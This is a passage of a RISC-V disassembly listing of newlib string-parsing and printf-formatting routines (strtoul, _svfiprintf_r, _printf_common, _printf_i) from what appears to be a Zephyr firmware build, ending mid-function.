80006604:	95aa                	add	a1,a1,a0
80006606:	87aa                	mv	a5,a0
80006608:	00b78563          	beq	a5,a1,80006612 <strnlen+0xe>
8000660c:	0007c703          	lbu	a4,0(a5)
80006610:	e701                	bnez	a4,80006618 <strnlen+0x14>
80006612:	40a78533          	sub	a0,a5,a0
80006616:	8082                	ret
80006618:	0785                	addi	a5,a5,1
8000661a:	b7fd                	j	80006608 <strnlen+0x4>

8000661c <_strtoul_l.constprop.0>:
8000661c:	800088b7          	lui	a7,0x80008
80006620:	8f2a                	mv	t5,a0
80006622:	87ae                	mv	a5,a1
80006624:	0e988893          	addi	a7,a7,233 # 800080e9 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800080ea>
80006628:	833e                	mv	t1,a5
8000662a:	0007c703          	lbu	a4,0(a5)
8000662e:	0785                	addi	a5,a5,1
80006630:	01170533          	add	a0,a4,a7
80006634:	00054803          	lbu	a6,0(a0)
80006638:	00887813          	andi	a6,a6,8
8000663c:	fe0816e3          	bnez	a6,80006628 <_strtoul_l.constprop.0+0xc>
80006640:	02d00513          	li	a0,45
80006644:	04a71f63          	bne	a4,a0,800066a2 <_strtoul_l.constprop.0+0x86>
80006648:	0007c703          	lbu	a4,0(a5)
8000664c:	4f85                	li	t6,1
8000664e:	00230793          	addi	a5,t1,2
80006652:	e2b5                	bnez	a3,800066b6 <_strtoul_l.constprop.0+0x9a>
80006654:	03000693          	li	a3,48
80006658:	08d70363          	beq	a4,a3,800066de <_strtoul_l.constprop.0+0xc2>
8000665c:	46a9                	li	a3,10
8000665e:	587d                	li	a6,-1
80006660:	02d85e33          	divu	t3,a6,a3
80006664:	4881                	li	a7,0
80006666:	4501                	li	a0,0
80006668:	42a5                	li	t0,9
8000666a:	4ee5                	li	t4,25
8000666c:	53fd                	li	t2,-1
8000666e:	02d87333          	remu	t1,a6,a3
80006672:	fd070813          	addi	a6,a4,-48
80006676:	0702ec63          	bltu	t0,a6,800066ee <_strtoul_l.constprop.0+0xd2>
8000667a:	8742                	mv	a4,a6
8000667c:	08d75763          	bge	a4,a3,8000670a <_strtoul_l.constprop.0+0xee>
80006680:	00788d63          	beq	a7,t2,8000669a <_strtoul_l.constprop.0+0x7e>
80006684:	58fd                	li	a7,-1
80006686:	00ae6a63          	bltu	t3,a0,8000669a <_strtoul_l.constprop.0+0x7e>
8000668a:	00ae1463          	bne	t3,a0,80006692 <_strtoul_l.constprop.0+0x76>
8000668e:	00e34663          	blt	t1,a4,8000669a <_strtoul_l.constprop.0+0x7e>
80006692:	4885                	li	a7,1
80006694:	02a68533          	mul	a0,a3,a0
80006698:	953a                	add	a0,a0,a4
8000669a:	0785                	addi	a5,a5,1
8000669c:	fff7c703          	lbu	a4,-1(a5)
800066a0:	bfc9                	j	80006672 <_strtoul_l.constprop.0+0x56>
800066a2:	02b00513          	li	a0,43
800066a6:	4f81                	li	t6,0
800066a8:	faa715e3          	bne	a4,a0,80006652 <_strtoul_l.constprop.0+0x36>
800066ac:	0007c703          	lbu	a4,0(a5)
800066b0:	00230793          	addi	a5,t1,2
800066b4:	bf79                	j	80006652 <_strtoul_l.constprop.0+0x36>
800066b6:	4541                	li	a0,16
800066b8:	faa693e3          	bne	a3,a0,8000665e <_strtoul_l.constprop.0+0x42>
800066bc:	03000513          	li	a0,48
800066c0:	f8a71fe3          	bne	a4,a0,8000665e <_strtoul_l.constprop.0+0x42>
800066c4:	0007c803          	lbu	a6,0(a5)
800066c8:	05800513          	li	a0,88
800066cc:	0df87813          	andi	a6,a6,223
800066d0:	f8a817e3          	bne	a6,a0,8000665e <_strtoul_l.constprop.0+0x42>
800066d4:	0017c703          	lbu	a4,1(a5)
800066d8:	46c1                	li	a3,16
800066da:	0789                	addi	a5,a5,2
800066dc:	b749                	j	8000665e <_strtoul_l.constprop.0+0x42>
800066de:	0007c803          	lbu	a6,0(a5)
800066e2:	05800513          	li	a0,88
800066e6:	46a1                	li	a3,8
800066e8:	0df87813          	andi	a6,a6,223
800066ec:	b7d5                	j	800066d0 <_strtoul_l.constprop.0+0xb4>
800066ee:	fbf70813          	addi	a6,a4,-65
800066f2:	010ee563          	bltu	t4,a6,800066fc <_strtoul_l.constprop.0+0xe0>
800066f6:	fc970713          	addi	a4,a4,-55
800066fa:	b749                	j	8000667c <_strtoul_l.constprop.0+0x60>
800066fc:	f9f70813          	addi	a6,a4,-97
80006700:	010ee563          	bltu	t4,a6,8000670a <_strtoul_l.constprop.0+0xee>
80006704:	fa970713          	addi	a4,a4,-87
80006708:	bf95                	j	8000667c <_strtoul_l.constprop.0+0x60>
8000670a:	577d                	li	a4,-1
8000670c:	00e89963          	bne	a7,a4,8000671e <_strtoul_l.constprop.0+0x102>
80006710:	02200713          	li	a4,34
80006714:	00ef2023          	sw	a4,0(t5)
80006718:	557d                	li	a0,-1
8000671a:	ea09                	bnez	a2,8000672c <_strtoul_l.constprop.0+0x110>
8000671c:	8082                	ret
8000671e:	000f8463          	beqz	t6,80006726 <_strtoul_l.constprop.0+0x10a>
80006722:	40a00533          	neg	a0,a0
80006726:	c611                	beqz	a2,80006732 <_strtoul_l.constprop.0+0x116>
80006728:	00088463          	beqz	a7,80006730 <_strtoul_l.constprop.0+0x114>
8000672c:	fff78593          	addi	a1,a5,-1
80006730:	c20c                	sw	a1,0(a2)
80006732:	8082                	ret

80006734 <strtoul>:
80006734:	86b2                	mv	a3,a2
80006736:	862e                	mv	a2,a1
80006738:	85aa                	mv	a1,a0
8000673a:	82c1a503          	lw	a0,-2004(gp) # 8000c014 <_impure_ptr>
8000673e:	edfff06f          	j	8000661c <_strtoul_l.constprop.0>

80006742 <__malloc_lock>:
80006742:	83418513          	addi	a0,gp,-1996 # 8000c01c <__lock___malloc_recursive_mutex>
80006746:	948fd06f          	j	8000388e <__retarget_lock_acquire_recursive>

8000674a <__malloc_unlock>:
8000674a:	83418513          	addi	a0,gp,-1996 # 8000c01c <__lock___malloc_recursive_mutex>
8000674e:	972fd06f          	j	800038c0 <__retarget_lock_release_recursive>

80006752 <__ssputs_r>:
80006752:	1101                	addi	sp,sp,-32
80006754:	c84a                	sw	s2,16(sp)
80006756:	0085a903          	lw	s2,8(a1)
8000675a:	cc22                	sw	s0,24(sp)
8000675c:	c64e                	sw	s3,12(sp)
8000675e:	c256                	sw	s5,4(sp)
80006760:	c05a                	sw	s6,0(sp)
80006762:	ce06                	sw	ra,28(sp)
80006764:	ca26                	sw	s1,20(sp)
80006766:	c452                	sw	s4,8(sp)
80006768:	0005aa83          	lw	s5,0(a1)
8000676c:	842e                	mv	s0,a1
8000676e:	8b32                	mv	s6,a2
80006770:	89b6                	mv	s3,a3
80006772:	0726e963          	bltu	a3,s2,800067e4 <__ssputs_r+0x92>
80006776:	00c59783          	lh	a5,12(a1)
8000677a:	4807f713          	andi	a4,a5,1152
8000677e:	c32d                	beqz	a4,800067e0 <__ssputs_r+0x8e>
80006780:	4858                	lw	a4,20(s0)
80006782:	448d                	li	s1,3
80006784:	498c                	lw	a1,16(a1)
80006786:	02e484b3          	mul	s1,s1,a4
8000678a:	4709                	li	a4,2
8000678c:	40ba8ab3          	sub	s5,s5,a1
80006790:	8a2a                	mv	s4,a0
80006792:	02e4c4b3          	div	s1,s1,a4
80006796:	00168713          	addi	a4,a3,1
8000679a:	9756                	add	a4,a4,s5
8000679c:	00e4f363          	bgeu	s1,a4,800067a2 <__ssputs_r+0x50>
800067a0:	84ba                	mv	s1,a4
800067a2:	4007f793          	andi	a5,a5,1024
800067a6:	c7bd                	beqz	a5,80006814 <__ssputs_r+0xc2>
800067a8:	85a6                	mv	a1,s1
800067aa:	8552                	mv	a0,s4
800067ac:	b87ff0ef          	jal	ra,80006332 <_malloc_r>
800067b0:	892a                	mv	s2,a0
800067b2:	c935                	beqz	a0,80006826 <__ssputs_r+0xd4>
800067b4:	480c                	lw	a1,16(s0)
800067b6:	8656                	mv	a2,s5
800067b8:	836fa0ef          	jal	ra,800007ee <memcpy>
800067bc:	00c45783          	lhu	a5,12(s0)
800067c0:	b7f7f793          	andi	a5,a5,-1153
800067c4:	0807e793          	ori	a5,a5,128
800067c8:	00f41623          	sh	a5,12(s0)
800067cc:	01242823          	sw	s2,16(s0)
800067d0:	c844                	sw	s1,20(s0)
800067d2:	9956                	add	s2,s2,s5
800067d4:	415484b3          	sub	s1,s1,s5
800067d8:	01242023          	sw	s2,0(s0)
800067dc:	c404                	sw	s1,8(s0)
800067de:	894e                	mv	s2,s3
800067e0:	0129f363          	bgeu	s3,s2,800067e6 <__ssputs_r+0x94>
800067e4:	894e                	mv	s2,s3
800067e6:	4008                	lw	a0,0(s0)
800067e8:	864a                	mv	a2,s2
800067ea:	85da                	mv	a1,s6
800067ec:	89cfa0ef          	jal	ra,80000888 <memmove>
800067f0:	441c                	lw	a5,8(s0)
800067f2:	4501                	li	a0,0
800067f4:	412787b3          	sub	a5,a5,s2
800067f8:	c41c                	sw	a5,8(s0)
800067fa:	401c                	lw	a5,0(s0)
800067fc:	97ca                	add	a5,a5,s2
800067fe:	c01c                	sw	a5,0(s0)
80006800:	40f2                	lw	ra,28(sp)
80006802:	4462                	lw	s0,24(sp)
80006804:	44d2                	lw	s1,20(sp)
80006806:	4942                	lw	s2,16(sp)
80006808:	49b2                	lw	s3,12(sp)
8000680a:	4a22                	lw	s4,8(sp)
8000680c:	4a92                	lw	s5,4(sp)
8000680e:	4b02                	lw	s6,0(sp)
80006810:	6105                	addi	sp,sp,32
80006812:	8082                	ret
80006814:	8626                	mv	a2,s1
80006816:	8552                	mv	a0,s4
80006818:	2591                	jal	80006e5c <_realloc_r>
8000681a:	892a                	mv	s2,a0
8000681c:	f945                	bnez	a0,800067cc <__ssputs_r+0x7a>
8000681e:	480c                	lw	a1,16(s0)
80006820:	8552                	mv	a0,s4
80006822:	a6fff0ef          	jal	ra,80006290 <_free_r>
80006826:	47b1                	li	a5,12
80006828:	00fa2023          	sw	a5,0(s4)
8000682c:	00c45783          	lhu	a5,12(s0)
80006830:	557d                	li	a0,-1
80006832:	0407e793          	ori	a5,a5,64
80006836:	00f41623          	sh	a5,12(s0)
8000683a:	b7d9                	j	80006800 <__ssputs_r+0xae>

8000683c <_svfiprintf_r>:
8000683c:	00c5d783          	lhu	a5,12(a1)
80006840:	7171                	addi	sp,sp,-176
80006842:	d522                	sw	s0,168(sp)
80006844:	d326                	sw	s1,164(sp)
80006846:	d14a                	sw	s2,160(sp)
80006848:	cd52                	sw	s4,152(sp)
8000684a:	d706                	sw	ra,172(sp)
8000684c:	cf4e                	sw	s3,156(sp)
8000684e:	cb56                	sw	s5,148(sp)
80006850:	c95a                	sw	s6,144(sp)
80006852:	c75e                	sw	s7,140(sp)
80006854:	c562                	sw	s8,136(sp)
80006856:	c366                	sw	s9,132(sp)
80006858:	c16a                	sw	s10,128(sp)
8000685a:	deee                	sw	s11,124(sp)
8000685c:	0807f793          	andi	a5,a5,128
80006860:	8a2a                	mv	s4,a0
80006862:	892e                	mv	s2,a1
80006864:	84b2                	mv	s1,a2
80006866:	8436                	mv	s0,a3
80006868:	c3b9                	beqz	a5,800068ae <_svfiprintf_r+0x72>
8000686a:	499c                	lw	a5,16(a1)
8000686c:	e3a9                	bnez	a5,800068ae <_svfiprintf_r+0x72>
8000686e:	04000593          	li	a1,64
80006872:	ac1ff0ef          	jal	ra,80006332 <_malloc_r>
80006876:	00a92023          	sw	a0,0(s2)
8000687a:	00a92823          	sw	a0,16(s2)
8000687e:	e505                	bnez	a0,800068a6 <_svfiprintf_r+0x6a>
80006880:	47b1                	li	a5,12
80006882:	00fa2023          	sw	a5,0(s4)
80006886:	557d                	li	a0,-1
80006888:	50ba                	lw	ra,172(sp)
8000688a:	542a                	lw	s0,168(sp)
8000688c:	549a                	lw	s1,164(sp)
8000688e:	590a                	lw	s2,160(sp)
80006890:	49fa                	lw	s3,156(sp)
80006892:	4a6a                	lw	s4,152(sp)
80006894:	4ada                	lw	s5,148(sp)
80006896:	4b4a                	lw	s6,144(sp)
80006898:	4bba                	lw	s7,140(sp)
8000689a:	4c2a                	lw	s8,136(sp)
8000689c:	4c9a                	lw	s9,132(sp)
8000689e:	4d0a                	lw	s10,128(sp)
800068a0:	5df6                	lw	s11,124(sp)
800068a2:	614d                	addi	sp,sp,176
800068a4:	8082                	ret
800068a6:	04000793          	li	a5,64
800068aa:	00f92a23          	sw	a5,20(s2)
800068ae:	02000793          	li	a5,32
800068b2:	02f104a3          	sb	a5,41(sp)
800068b6:	03000793          	li	a5,48
800068ba:	d202                	sw	zero,36(sp)
800068bc:	02f10523          	sb	a5,42(sp)
800068c0:	c622                	sw	s0,12(sp)
800068c2:	02500c93          	li	s9,37
800068c6:	80008b37          	lui	s6,0x80008
800068ca:	80008bb7          	lui	s7,0x80008
800068ce:	80008d37          	lui	s10,0x80008
800068d2:	80006c37          	lui	s8,0x80006
800068d6:	00000a93          	li	s5,0
800068da:	8426                	mv	s0,s1
800068dc:	00044783          	lbu	a5,0(s0)
800068e0:	c399                	beqz	a5,800068e6 <_svfiprintf_r+0xaa>
800068e2:	09979f63          	bne	a5,s9,80006980 <_svfiprintf_r+0x144>
800068e6:	40940db3          	sub	s11,s0,s1
800068ea:	00940e63          	beq	s0,s1,80006906 <_svfiprintf_r+0xca>
800068ee:	86ee                	mv	a3,s11
800068f0:	8626                	mv	a2,s1
800068f2:	85ca                	mv	a1,s2
800068f4:	8552                	mv	a0,s4
800068f6:	e5dff0ef          	jal	ra,80006752 <__ssputs_r>
800068fa:	57fd                	li	a5,-1
800068fc:	18f50a63          	beq	a0,a5,80006a90 <_svfiprintf_r+0x254>
80006900:	5792                	lw	a5,36(sp)
80006902:	97ee                	add	a5,a5,s11
80006904:	d23e                	sw	a5,36(sp)
80006906:	00044783          	lbu	a5,0(s0)
8000690a:	18078363          	beqz	a5,80006a90 <_svfiprintf_r+0x254>
8000690e:	57fd                	li	a5,-1
80006910:	00140493          	addi	s1,s0,1
80006914:	c802                	sw	zero,16(sp)
80006916:	ce02                	sw	zero,28(sp)
80006918:	ca3e                	sw	a5,20(sp)
8000691a:	cc02                	sw	zero,24(sp)
8000691c:	040109a3          	sb	zero,83(sp)
80006920:	d482                	sw	zero,104(sp)
80006922:	4d85                	li	s11,1
80006924:	0004c583          	lbu	a1,0(s1)
80006928:	4615                	li	a2,5
8000692a:	1ecb0513          	addi	a0,s6,492 # 800081ec <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800081ed>
8000692e:	2b11                	jal	80006e42 <memchr>
80006930:	47c2                	lw	a5,16(sp)
80006932:	00148413          	addi	s0,s1,1
80006936:	e539                	bnez	a0,80006984 <_svfiprintf_r+0x148>
80006938:	0107f713          	andi	a4,a5,16
8000693c:	c709                	beqz	a4,80006946 <_svfiprintf_r+0x10a>
8000693e:	02000713          	li	a4,32
80006942:	04e109a3          	sb	a4,83(sp)
80006946:	0087f713          	andi	a4,a5,8
8000694a:	c709                	beqz	a4,80006954 <_svfiprintf_r+0x118>
8000694c:	02b00713          	li	a4,43
80006950:	04e109a3          	sb	a4,83(sp)
80006954:	0004c683          	lbu	a3,0(s1)
80006958:	02a00713          	li	a4,42
8000695c:	02e68d63          	beq	a3,a4,80006996 <_svfiprintf_r+0x15a>
80006960:	47f2                	lw	a5,28(sp)
80006962:	8426                	mv	s0,s1
80006964:	4681                	li	a3,0
80006966:	4625                	li	a2,9
80006968:	4529                	li	a0,10
8000696a:	00044703          	lbu	a4,0(s0)
8000696e:	00140593          	addi	a1,s0,1
80006972:	fd070713          	addi	a4,a4,-48
80006976:	06e67663          	bgeu	a2,a4,800069e2 <_svfiprintf_r+0x1a6>
8000697a:	c695                	beqz	a3,800069a6 <_svfiprintf_r+0x16a>
8000697c:	ce3e                	sw	a5,28(sp)
8000697e:	a025                	j	800069a6 <_svfiprintf_r+0x16a>
80006980:	0405                	addi	s0,s0,1
80006982:	bfa9                	j	800068dc <_svfiprintf_r+0xa0>
80006984:	1ecb0713          	addi	a4,s6,492
80006988:	8d19                	sub	a0,a0,a4
8000698a:	00ad9533          	sll	a0,s11,a0
8000698e:	8fc9                	or	a5,a5,a0
80006990:	c83e                	sw	a5,16(sp)
80006992:	84a2                	mv	s1,s0
80006994:	bf41                	j	80006924 <_svfiprintf_r+0xe8>
80006996:	4732                	lw	a4,12(sp)
80006998:	00470693          	addi	a3,a4,4
8000699c:	4318                	lw	a4,0(a4)
8000699e:	c636                	sw	a3,12(sp)
800069a0:	02074a63          	bltz	a4,800069d4 <_svfiprintf_r+0x198>
800069a4:	ce3a                	sw	a4,28(sp)
800069a6:	00044703          	lbu	a4,0(s0)
800069aa:	02e00793          	li	a5,46
800069ae:	04f71f63          	bne	a4,a5,80006a0c <_svfiprintf_r+0x1d0>
800069b2:	00144703          	lbu	a4,1(s0)
800069b6:	02a00793          	li	a5,42
800069ba:	02f71a63          	bne	a4,a5,800069ee <_svfiprintf_r+0x1b2>
800069be:	47b2                	lw	a5,12(sp)
800069c0:	0409                	addi	s0,s0,2
800069c2:	00478713          	addi	a4,a5,4
800069c6:	439c                	lw	a5,0(a5)
800069c8:	c63a                	sw	a4,12(sp)
800069ca:	0007d363          	bgez	a5,800069d0 <_svfiprintf_r+0x194>
800069ce:	57fd                	li	a5,-1
800069d0:	ca3e                	sw	a5,20(sp)
800069d2:	a82d                	j	80006a0c <_svfiprintf_r+0x1d0>
800069d4:	40e00733          	neg	a4,a4
800069d8:	0027e793          	ori	a5,a5,2
800069dc:	ce3a                	sw	a4,28(sp)
800069de:	c83e                	sw	a5,16(sp)
800069e0:	b7d9                	j	800069a6 <_svfiprintf_r+0x16a>
800069e2:	02a787b3          	mul	a5,a5,a0
800069e6:	842e                	mv	s0,a1
800069e8:	4685                	li	a3,1
800069ea:	97ba                	add	a5,a5,a4
800069ec:	bfbd                	j	8000696a <_svfiprintf_r+0x12e>
800069ee:	0405                	addi	s0,s0,1
800069f0:	ca02                	sw	zero,20(sp)
800069f2:	4681                	li	a3,0
800069f4:	4781                	li	a5,0
800069f6:	4625                	li	a2,9
800069f8:	4529                	li	a0,10
800069fa:	00044703          	lbu	a4,0(s0)
800069fe:	00140593          	addi	a1,s0,1
80006a02:	fd070713          	addi	a4,a4,-48
80006a06:	04e67d63          	bgeu	a2,a4,80006a60 <_svfiprintf_r+0x224>
80006a0a:	f2f9                	bnez	a3,800069d0 <_svfiprintf_r+0x194>
80006a0c:	00044583          	lbu	a1,0(s0)
80006a10:	460d                	li	a2,3
80006a12:	1f4b8513          	addi	a0,s7,500 # 800081f4 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800081f5>
80006a16:	2135                	jal	80006e42 <memchr>
80006a18:	cd01                	beqz	a0,80006a30 <_svfiprintf_r+0x1f4>
80006a1a:	1f4b8793          	addi	a5,s7,500
80006a1e:	8d1d                	sub	a0,a0,a5
80006a20:	47c2                	lw	a5,16(sp)
80006a22:	04000713          	li	a4,64
80006a26:	00a71733          	sll	a4,a4,a0
80006a2a:	8fd9                	or	a5,a5,a4
80006a2c:	0405                	addi	s0,s0,1
80006a2e:	c83e                	sw	a5,16(sp)
80006a30:	00044583          	lbu	a1,0(s0)
80006a34:	4619                	li	a2,6
80006a36:	1f8d0513          	addi	a0,s10,504 # 800081f8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800081f9>
80006a3a:	00140493          	addi	s1,s0,1
80006a3e:	02b10423          	sb	a1,40(sp)
80006a42:	2101                	jal	80006e42 <memchr>
80006a44:	cd31                	beqz	a0,80006aa0 <_svfiprintf_r+0x264>
80006a46:	020a9763          	bnez	s5,80006a74 <_svfiprintf_r+0x238>
80006a4a:	4742                	lw	a4,16(sp)
80006a4c:	47b2                	lw	a5,12(sp)
80006a4e:	10077713          	andi	a4,a4,256
80006a52:	cf09                	beqz	a4,80006a6c <_svfiprintf_r+0x230>
80006a54:	0791                	addi	a5,a5,4
80006a56:	c63e                	sw	a5,12(sp)
80006a58:	5792                	lw	a5,36(sp)
80006a5a:	97ce                	add	a5,a5,s3
80006a5c:	d23e                	sw	a5,36(sp)
80006a5e:	bdb5                	j	800068da <_svfiprintf_r+0x9e>
80006a60:	02a787b3          	mul	a5,a5,a0
80006a64:	842e                	mv	s0,a1
80006a66:	4685                	li	a3,1
80006a68:	97ba                	add	a5,a5,a4
80006a6a:	bf41                	j	800069fa <_svfiprintf_r+0x1be>
80006a6c:	079d                	addi	a5,a5,7
80006a6e:	9be1                	andi	a5,a5,-8
80006a70:	07a1                	addi	a5,a5,8
80006a72:	b7d5                	j	80006a56 <_svfiprintf_r+0x21a>
80006a74:	0078                	addi	a4,sp,12
80006a76:	752c0693          	addi	a3,s8,1874 # 80006752 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80006753>
80006a7a:	864a                	mv	a2,s2
80006a7c:	080c                	addi	a1,sp,16
80006a7e:	8552                	mv	a0,s4
80006a80:	00000097          	auipc	ra,0x0
80006a84:	000000e7          	jalr	zero # 0 <CONFIG_2ND_LVL_INTR_01_OFFSET>
80006a88:	57fd                	li	a5,-1
80006a8a:	89aa                	mv	s3,a0
80006a8c:	fcf516e3          	bne	a0,a5,80006a58 <_svfiprintf_r+0x21c>
80006a90:	00c95783          	lhu	a5,12(s2)
80006a94:	0407f793          	andi	a5,a5,64
80006a98:	de0797e3          	bnez	a5,80006886 <_svfiprintf_r+0x4a>
80006a9c:	5512                	lw	a0,36(sp)
80006a9e:	b3ed                	j	80006888 <_svfiprintf_r+0x4c>
80006aa0:	0078                	addi	a4,sp,12
80006aa2:	752c0693          	addi	a3,s8,1874
80006aa6:	864a                	mv	a2,s2
80006aa8:	080c                	addi	a1,sp,16
80006aaa:	8552                	mv	a0,s4
80006aac:	2a11                	jal	80006bc0 <_printf_i>
80006aae:	bfe9                	j	80006a88 <_svfiprintf_r+0x24c>

80006ab0 <_printf_common>:
80006ab0:	7179                	addi	sp,sp,-48
80006ab2:	ca56                	sw	s5,20(sp)
80006ab4:	499c                	lw	a5,16(a1)
80006ab6:	8aba                	mv	s5,a4
80006ab8:	4598                	lw	a4,8(a1)
80006aba:	d422                	sw	s0,40(sp)
80006abc:	d04a                	sw	s2,32(sp)
80006abe:	ce4e                	sw	s3,28(sp)
80006ac0:	cc52                	sw	s4,24(sp)
80006ac2:	d606                	sw	ra,44(sp)
80006ac4:	d226                	sw	s1,36(sp)
80006ac6:	c85a                	sw	s6,16(sp)
80006ac8:	c65e                	sw	s7,12(sp)
80006aca:	89aa                	mv	s3,a0
80006acc:	842e                	mv	s0,a1
80006ace:	8932                	mv	s2,a2
80006ad0:	8a36                	mv	s4,a3
80006ad2:	00e7d363          	bge	a5,a4,80006ad8 <_printf_common+0x28>
80006ad6:	87ba                	mv	a5,a4
80006ad8:	00f92023          	sw	a5,0(s2)
80006adc:	04344703          	lbu	a4,67(s0)
80006ae0:	c701                	beqz	a4,80006ae8 <_printf_common+0x38>
80006ae2:	0785                	addi	a5,a5,1
80006ae4:	00f92023          	sw	a5,0(s2)
80006ae8:	401c                	lw	a5,0(s0)
80006aea:	0207f793          	andi	a5,a5,32
80006aee:	c791                	beqz	a5,80006afa <_printf_common+0x4a>
80006af0:	00092783          	lw	a5,0(s2)
80006af4:	0789                	addi	a5,a5,2
80006af6:	00f92023          	sw	a5,0(s2)
80006afa:	4004                	lw	s1,0(s0)
80006afc:	8899                	andi	s1,s1,6
80006afe:	e891                	bnez	s1,80006b12 <_printf_common+0x62>
80006b00:	01940b13          	addi	s6,s0,25
80006b04:	5bfd                	li	s7,-1
80006b06:	445c                	lw	a5,12(s0)
80006b08:	00092703          	lw	a4,0(s2)
80006b0c:	8f99                	sub	a5,a5,a4
80006b0e:	04f4cc63          	blt	s1,a5,80006b66 <_printf_common+0xb6>
80006b12:	04344783          	lbu	a5,67(s0)
80006b16:	00f036b3          	snez	a3,a5
80006b1a:	401c                	lw	a5,0(s0)
80006b1c:	0207f793          	andi	a5,a5,32
80006b20:	eba5                	bnez	a5,80006b90 <_printf_common+0xe0>
80006b22:	04340613          	addi	a2,s0,67
80006b26:	85d2                	mv	a1,s4
80006b28:	854e                	mv	a0,s3
80006b2a:	9a82                	jalr	s5
80006b2c:	57fd                	li	a5,-1
80006b2e:	04f50363          	beq	a0,a5,80006b74 <_printf_common+0xc4>
80006b32:	401c                	lw	a5,0(s0)
80006b34:	4711                	li	a4,4
80006b36:	4481                	li	s1,0
80006b38:	8b99                	andi	a5,a5,6
80006b3a:	00e79963          	bne	a5,a4,80006b4c <_printf_common+0x9c>
80006b3e:	4444                	lw	s1,12(s0)
80006b40:	00092783          	lw	a5,0(s2)
80006b44:	8c9d                	sub	s1,s1,a5
80006b46:	0004d363          	bgez	s1,80006b4c <_printf_common+0x9c>
80006b4a:	4481                	li	s1,0
80006b4c:	441c                	lw	a5,8(s0)
80006b4e:	4818                	lw	a4,16(s0)
80006b50:	00f75463          	bge	a4,a5,80006b58 <_printf_common+0xa8>
80006b54:	8f99                	sub	a5,a5,a4
80006b56:	94be                	add	s1,s1,a5
80006b58:	4901                	li	s2,0
80006b5a:	0469                	addi	s0,s0,26
80006b5c:	5b7d                	li	s6,-1
80006b5e:	05249863          	bne	s1,s2,80006bae <_printf_common+0xfe>
80006b62:	4501                	li	a0,0
80006b64:	a809                	j	80006b76 <_printf_common+0xc6>
80006b66:	4685                	li	a3,1
80006b68:	865a                	mv	a2,s6
80006b6a:	85d2                	mv	a1,s4
80006b6c:	854e                	mv	a0,s3
80006b6e:	9a82                	jalr	s5
80006b70:	01751e63          	bne	a0,s7,80006b8c <_printf_common+0xdc>
80006b74:	557d                	li	a0,-1
80006b76:	50b2                	lw	ra,44(sp)
80006b78:	5422                	lw	s0,40(sp)
80006b7a:	5492                	lw	s1,36(sp)
80006b7c:	5902                	lw	s2,32(sp)
80006b7e:	49f2                	lw	s3,28(sp)
80006b80:	4a62                	lw	s4,24(sp)
80006b82:	4ad2                	lw	s5,20(sp)
80006b84:	4b42                	lw	s6,16(sp)
80006b86:	4bb2                	lw	s7,12(sp)
80006b88:	6145                	addi	sp,sp,48
80006b8a:	8082                	ret
80006b8c:	0485                	addi	s1,s1,1
80006b8e:	bfa5                	j	80006b06 <_printf_common+0x56>
80006b90:	00d40733          	add	a4,s0,a3
80006b94:	03000613          	li	a2,48
80006b98:	04c701a3          	sb	a2,67(a4)
80006b9c:	04544703          	lbu	a4,69(s0)
80006ba0:	00168793          	addi	a5,a3,1
80006ba4:	97a2                	add	a5,a5,s0
80006ba6:	0689                	addi	a3,a3,2
80006ba8:	04e781a3          	sb	a4,67(a5)
80006bac:	bf9d                	j	80006b22 <_printf_common+0x72>
80006bae:	4685                	li	a3,1
80006bb0:	8622                	mv	a2,s0
80006bb2:	85d2                	mv	a1,s4
80006bb4:	854e                	mv	a0,s3
80006bb6:	9a82                	jalr	s5
80006bb8:	fb650ee3          	beq	a0,s6,80006b74 <_printf_common+0xc4>
80006bbc:	0905                	addi	s2,s2,1
80006bbe:	b745                	j	80006b5e <_printf_common+0xae>

80006bc0 <_printf_i>:
80006bc0:	7179                	addi	sp,sp,-48
80006bc2:	d422                	sw	s0,40(sp)
80006bc4:	d226                	sw	s1,36(sp)
80006bc6:	d04a                	sw	s2,32(sp)
80006bc8:	ce4e                	sw	s3,28(sp)
80006bca:	d606                	sw	ra,44(sp)
80006bcc:	cc52                	sw	s4,24(sp)
80006bce:	ca56                	sw	s5,20(sp)
80006bd0:	c85a                	sw	s6,16(sp)
80006bd2:	0185c883          	lbu	a7,24(a1)
80006bd6:	07800793          	li	a5,120
80006bda:	84aa                	mv	s1,a0
80006bdc:	842e                	mv	s0,a1
80006bde:	8932                	mv	s2,a2
80006be0:	89b6                	mv	s3,a3
80006be2:	0117ee63          	bltu	a5,a7,80006bfe <_printf_i+0x3e>
80006be6:	06200793          	li	a5,98
80006bea:	04358693          	addi	a3,a1,67
80006bee:	0117ed63          	bltu	a5,a7,80006c08 <_printf_i+0x48>
80006bf2:	1c088e63          	beqz	a7,80006dce <_printf_i+0x20e>
80006bf6:	05800793          	li	a5,88
80006bfa:	16f88763          	beq	a7,a5,80006d68 <_printf_i+0x1a8>
80006bfe:	04240a93          	addi	s5,s0,66
80006c02:	05140123          	sb	a7,66(s0)
80006c06:	a80d                	j	80006c38 <_printf_i+0x78>
80006c08:	f9d88793          	addi	a5,a7,-99
80006c0c:	0ff7f793          	zext.b	a5,a5
80006c10:	4655                	li	a2,21
80006c12:	fef666e3          	bltu	a2,a5,80006bfe <_printf_i+0x3e>
80006c16:	80008637          	lui	a2,0x80008
80006c1a:	078a                	slli	a5,a5,0x2
80006c1c:	22860613          	addi	a2,a2,552 # 80008228 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008229>
80006c20:	97b2                	add	a5,a5,a2
80006c22:	439c                	lw	a5,0(a5)
80006c24:	8782                	jr	a5
80006c26:	431c                	lw	a5,0(a4)
80006c28:	04258a93          	addi	s5,a1,66
80006c2c:	00478693          	addi	a3,a5,4
80006c30:	439c                	lw	a5,0(a5)
80006c32:	c314                	sw	a3,0(a4)
80006c34:	04f58123          	sb	a5,66(a1)
80006c38:	4785                	li	a5,1
80006c3a:	aa6d                	j	80006df4 <_printf_i+0x234>
80006c3c:	4190                	lw	a2,0(a1)
80006c3e:	431c                	lw	a5,0(a4)
80006c40:	08067513          	andi	a0,a2,128
80006c44:	00478593          	addi	a1,a5,4
80006c48:	c139                	beqz	a0,80006c8e <_printf_i+0xce>
80006c4a:	439c                	lw	a5,0(a5)
80006c4c:	c30c                	sw	a1,0(a4)
80006c4e:	80008737          	lui	a4,0x80008
80006c52:	404c                	lw	a1,4(s0)
